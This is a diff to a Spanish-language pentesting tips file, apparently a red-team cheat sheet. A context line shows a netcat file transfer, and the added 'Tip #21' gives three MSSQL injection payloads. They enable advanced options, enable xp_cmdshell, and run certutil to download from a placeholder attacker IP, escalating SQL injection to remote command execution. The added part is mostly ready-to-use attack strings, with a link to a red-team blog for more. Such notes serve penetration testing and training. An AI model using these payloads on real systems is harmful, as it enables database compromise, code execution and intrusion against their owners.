@@ -771,3 +771,19 @@ Ahora en la maquina que envia el archivo ejecutaremos el siguiente comando:
 ```bash
 nc -w 3 [IP-que-recibe-el-archivo] 1234 < test.txt
 ```
+## Tip #21: De inyección SQL a RCE
+Se puede obtener una ejecución remota de comandos a partir de una inyección sql, las instrucciones que se muestran a continuación son para MSSQL Server, sin embargo, es posible hacerlo para los demas DBMS.
+
+Primero tenemos que habilitar las opciones avanzadas:
+```bash
+inyeccion';EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+```
+Depues tenemos que habilitar el uso de ```xp_cmdshell```:
+```bash
+inyeccion';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+```
+Una vez hecho esto podemos ejecutar comandos a nivel de sistema:
+```bash
+inyeccion';EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.X.X';--
+```
+Para una mayor información visitar el siguiente enlace: https://www.tarlogic.com/es/blog/red-team-tales-0x01/
